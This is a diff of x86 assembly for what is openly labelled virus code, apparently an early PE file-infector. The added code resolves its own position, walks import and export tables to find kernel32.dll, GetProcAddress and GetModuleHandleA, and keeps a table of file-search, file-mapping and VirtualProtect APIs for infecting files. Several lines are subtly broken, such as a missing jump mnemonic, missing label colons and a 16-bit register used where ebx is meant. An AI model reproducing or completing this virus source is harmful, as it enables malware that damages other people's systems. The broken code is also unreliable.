@@ -39,84 +39,122 @@ virusCode:
 delta: 
 	pop ebp
 	mov eax,ebp
-	sub ebp,dword ptr delta
+	sub ebp,offset delta
 	mov [ebp+delta_var],ebp
-	;call 
+	call start 
+start:
+	pop eax
+	and eax,0xFFF00000				; ...00000
+	mov [ebp+image_base],eax			; save image base
+	
 scan_import:
 	mov esi,[image_base+ebp]			; point on image base
-	add eax,3ch						;
-	mov eax,[eax]					;
-	add eax,esi						;
-	add eax,128						;
-	mov eax,[eax]					;
-	add eax,esi
-	add eax,12
+	add eax,3ch						; At offset 3ch is the dword 'header relocation'.This value here= offset begin (PE header)  
+	mov eax,[eax]					; get the value (PE header value)
+	add eax,esi						; +image_base (point to PE header)
+	add eax,128						; +80H (import directory RVA)
+	mov eax,[eax]					; get value at this current eax
+	add eax,esi						; now point to import table (+ image_base)
+	add eax,12						; +CH (point to .dll)   
+	
 find_kernel32:
-	xor ebx,ebx
-	cmp dword ptr [eax],ebx
-	je end_objecttable
-	call is_it_kernel32
-	cmp ecx,3
-	jae find_kernel32
-find_kernel_image_base:
-	mov eax,[eax+4]
-	add eax,esi
-	mov eax,[eax]
-	xchg edi,eax
+	xor ebx,ebx						; reset ebx
+	cmp dword ptr [eax],ebx				; cmp if value tai eax=0
+	je end_objecttable				; if= jmp to end_objectable
+	call is_it_kernel32				; else check if it is kernel32
+	cmp ecx,3						; check if return value=3
+	jae find_kernel_image_base			; if return>=3 jmp find kernel32 image base
+	add eax,20						; else move to another .dll file
+	jmp find_kernel32					; find again
+	
+find_kernel_image_base:					; go to find kernel in image base
+	mov eax,[eax+4]					; point to list API address pointer
+	add eax,esi						; + image_base
+	mov eax,[eax]					; now eax=address of 1st API from kernel32
+	xchg edi,eax					; swap with edi, edi=address of 1st API
+	
 find_MZ_in_kernel:
-	dec edi
-	mov esi,edi
-	cmp word ptr [edi],"MZ"
-	jne find_MZ_in_kernel
+	dec edi						; decrease edi
+	mov esi,edi						; 
+	cmp word ptr [edi],"MZ"				; check MZ
+	jne find_MZ_in_kernel				; not found then loop
 	
-	mov esi,[esi+3CH]
-	cmp esi,dword  ptr 200H
-	ja find_MZ_in_kernel
+	mov esi,[esi+3CH]					; if ok, move to header relocation then get value
+	cmp esi,dword  ptr 200H				; cmp if header reloc=200H
+	ja find_MZ_in_kernel				; if >200H jmp then loop
 	
-	add esi,edi
-	cmp word ptr [esi],"PE"
-	jne find_MZ_in_kernel
-	add esi,52
+	add esi,edi						; go to new header
+	cmp word ptr [esi],"PE"				; check PE
+	jne find_MZ_in_kernel				; no loop again
+	add esi,52						; point to image_base_dword
 	
-	cmp edi,dword ptr [esi]
-	jne find_MZ_in_kernel
+	cmp edi,dword ptr [esi]				; check if edi=image_base 
+	jne find_MZ_in_kernel				; loop again
 	
-	mov esi,edi
-	add esi,3CH
-	mov esi,[esi]
-	add esi,edi
+	mov esi,edi						; esi=image base of kernel32.dll 
+	add esi,3CH						; mov to header relocation
+	mov esi,[esi]					; get value
+	add esi,edi						; +image base => PE header
 	
-	add esi,120
-	mov esi,[esi]
-	add esi,edi				; !!! esi point now to the EXPORT TABLE !!!
+	add esi,120						; move to export table
+	mov esi,[esi]					; get value
+	add esi,edi						; +image_base->esi point to the export table !!!
 	
 find_API:
 	push ebp
 	call find_ProcAddress
 	mov ebx,[esp]
-	mov dword ptr [ebx+GetProcAddressAdd],ebp
+	mov dword ptr [ebx+GetProcAddressAddress],ebp
 	pop ebp
 	
 	push ebp
-	call find_getModuleHandle
-
-is_it_kernel32: 
-	xor ecx,ecx
-	mov ebx,dword ptr [eax]
-	add ebx,esi
+	call find_GetModuleHandle
+	mov ebx,[esp]
+	mov dword ptr [ebx+GetModuleHandleAddress],ebp
+	pop ebp
+	
+	push dword[ebp+kernel_string]					; get kernel32 image_base
+	call [ebp+GetModuleHandleAddress]				; call module handle for image
+	mov dword[ebp+handle],eax					; save handle from eax
+	
+	call GetAPIAddress						; now get api address 
+	
+	push dword [ebp+virtual_out] 
+	push dword 0x80
+	push dword 0x1000
+	push dword [ebp+image_base]
+	call [ebp+Virtual]
+	
+is_it_kernel32: 				; check is it kernel32.dll
+	xor ecx,ecx				; reset ecx
+	mov ebx,dword ptr [eax]		; set ebx=[eax]
+	add ebx,esi				; add image_base
+	cmp dword ptr[ebx],"kern"	; cmp with Kern
+	jne az1				; if not equal jmp to az1
+	inc ecx				; else ecx+=1
+case_2:
 	cmp dword ptr[ebx],"Kern"
 	jne az1
 	inc ecx
-az1:	
-	cmp dword ptr[ebx+4],"el32"
+az1:		
+	cmp dword ptr[ebx+4],"el32"	; mov to next 4 bit then cmp with "el32"
+	jne az2				; if not jmp to az2
+	inc ecx				; else ecx+=1
+az1_case_2:
+	cmp dword ptr[bx+4],"EL32"
 	jne az2
 	inc ecx
 az2:	
-	cmp dword ptr[ebx+16],".DLL"
+	cmp dword ptr[ebx+16],".DLL"	;
+	jne az3				;
+	inc ecx				; else ecx+=1
+az2_case_2:
+	cmp dword ptr[ebx+16],".dll"
 	jne az3
 	inc ecx
 az3:	
 	ret
+	
 find_ProcAddress:
 	xor eax,eax
 	xor ecx,ecx
@@ -128,18 +166,94 @@ find_ProcAddress:
 	mov ebp,esi
 	
 	add ebp,28			; ebp now points to RVA of List of Function Addresses    	
-	add eax,32
+	add eax,32			; 
 	
 	mov ebp,[ebp]
 	add ebp,edi
+	
 	mov eax,[eax]
 	add eax,edi
 	
 	mov ebx,eax
 	mov eax,[ebx]
 	add eax,edi
-	;invoke SetCurrentDirectory, addr path
-	;call ScanFiles
+search_procaddress:
+	cmp dword[eax],"GetP"
+	je search_procadress_1
+back_search_procadress:
+	add ebx,4
+	inc edx
+	mov eax,[ebx]
+	add eax,edi
+	add ebp,4
+	jmp search_procaddress
+search_procadress_1:	
+	cmp dword[eax+4],"rocA"
+	jne back_search_procadress
+	inc ecx
+search_procadress_2
+	cmp dword[eax+8],"ddre"
+	jne back_search_procadress
+	inc ecx
+search_procadress_3:
+	cmp dword[eax+12],"ss"
+	back_search_procadress
+	inc ecx
+search_procadress_4:
+	mov ebp,[ebp]
+	add ebp,edi
+	ret
+	
+find_GetModuleHandle:
+	xor eax,eax
+	xor ecx,ecx
+	xor edx,edx
+	xor ebp,ebp
+	
+	inc edx
+	mov eax,esi
+	mov ebp,esi
+	
+	add ebp,28			; ebp now points to RVA of List of Function Addresses    	
+	add eax,32			; 
+	
+	mov ebp,[ebp]
+	add ebp,edi
+	
+	mov eax,[eax]
+	add eax,edi
+	
+	mov ebx,eax
+	mov eax,[ebx]
+	add eax,edi
+search_module	
+	cmp dword[eax],"GetM"
+	je search_module_1
+back_search_module:
+	add ebx,4
+	inc edx
+	mov eax,[ebx]
+	add eax,edi
+	add ebp,4
+	jmp search_module
+search_module_1:
+	cmp dword[eax+4],"odul"
+	jne back_search_module
+	inc ecx
+search_module_2:
+	cmp dword[eax+8],"eHan"
+	jne back_search_module
+	inc ecx
+search_module_3:
+	cmp dword[eax+12],"dleA"
+	jne back_search_module
+	inc ecx
+search_module_4:
+	mov ebp,[ebp]
+	add ebp,edi
+	ret
+erreur:	
+	
 	
 	popfd
 	popad
@@ -196,12 +310,6 @@ CheckFile proc fileName:dword
 
 CheckFile endp
 
-OpenFileTest proc 
-	
-	
-	ret
-
-OpenFileTest endp
 
 end_objecttable:
 
@@ -250,17 +358,17 @@ APIName:
 	CloseHandleStr        		db    "CloseHandle", 0 
 	VirtualProtectStr    		db    "VirtualProtect", 0
 	
-APIAdd:
-	FindNextFileAAdd   	 	dd    0h
-	FindFirstFileAAdd   	 	dd    0h
-	CreateFileAAdd        		dd    0h
-	CreateFileMappingAAdd    	dd    0h
-	MapViewOfFileAAdd   	 	dd    0h
-	GetModuleHandleAAdd  	 	dd    0h
-	GetProcAddressAdd    		dd    0h 
-	UnmapViewOfFileAdd    		dd    0h
-	CloseHandleAdd        		dd    0h
-	VirtualProtectAdd    		dd    0h
+APIAddress:
+	FindNextFileAAddress    	 	dd    0h
+	FindFirstFileAAddress   	 	dd    0h
+	CreateFileAAddress       		dd    0h
+	CreateFileMappingAAddress   		dd    0h
+	MapViewOfFileAAddress 	 		dd    0h
+	GetModuleHandleAddress  	 	dd    0h
+	GetProcAddressAddress   		dd    0h 
+	UnmapViewOfFileAddress   		dd    0h
+	CloseHandleAddress        		dd    0h
+	VirtualProtectAddress    		dd    0h
 
 
 end virusCode
